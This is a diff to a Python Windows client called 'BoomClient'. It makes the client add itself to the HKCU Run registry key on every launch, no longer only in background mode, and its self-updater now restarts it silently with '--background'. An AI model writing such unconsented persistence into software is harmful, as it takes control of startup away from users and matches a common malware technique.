@@ -96,21 +96,20 @@ def setup_auto_start():
         exe_path = f'"{sys.executable}" --background'
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
         try:
-            existing_value, _ = winreg.QueryValueEx(key, 'BoomServiceV2')
+            existing_value, _ = winreg.QueryValueEx(key, 'BoomServiceV3')
             winreg.CloseKey(key)
             if existing_value == exe_path:
                 return True
         except FileNotFoundError:
             winreg.CloseKey(key)
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'BoomServiceV2', 0, winreg.REG_SZ, exe_path)
+        winreg.SetValueEx(key, 'BoomServiceV3', 0, winreg.REG_SZ, exe_path)
         winreg.CloseKey(key)
         return True
     except Exception:
         return False
 
-if BACKGROUND_MODE:
-    setup_auto_start()
+setup_auto_start()
 
 
 class BoomClient:
@@ -1440,7 +1439,7 @@ class BoomClient:
                 f.write('timeout /t 2 /nobreak >nul\n')
                 f.write(f'copy /y "{tmp_exe}" "{current_exe}"\n')
                 f.write(f'del /q "{tmp_exe}"\n')
-                f.write(f'start "" "{current_exe}"\n')
+                f.write(f'start "" "{current_exe}" --background\n')
                 f.write('del /q "%~f0"\n')
 
             # Send success message
